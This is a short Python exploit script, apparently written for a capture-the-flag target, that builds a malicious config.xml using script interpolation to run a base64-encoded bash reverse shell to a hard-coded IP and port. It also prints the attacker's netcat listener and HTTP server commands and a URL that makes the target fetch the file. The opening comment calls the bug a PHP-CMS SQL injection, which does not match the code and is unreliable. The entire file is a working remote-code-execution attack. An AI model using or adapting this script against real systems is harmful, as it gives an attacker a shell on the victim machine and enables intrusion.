# CVE-2022-33980 PHP-CMS v1.0存在SQL注入漏洞
import base64

host = "122.111.22.22"
port = "2223"
http_port = '2221'
pa = "/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
url = f"http://eci-2zeg2tuyogpukguzc3qq.cloudeci1.ichunqiu.com/Url?url=http://{host}:{http_port}/config.xml&data=path"
print(f'攻击机:\nnc -lvp {port}\npython3 -m http.server {http_port}\ncopy config.xml到攻击机')
print(url)

ab64 = base64.b64encode(pa.encode()).decode()
payload = fr"""echo,{ab64}"""
txt = r"""<?xml version="1.0" encoding="ISO-8859-1" ?>
<configuration>
        <path>${script:js:java.lang.Runtime.getRuntime().exec("bash -c {%s}|{base64,-d}|{bash,-i}")}</path>
</configuration>
""" % payload
open('config.xml', 'w').write(txt)
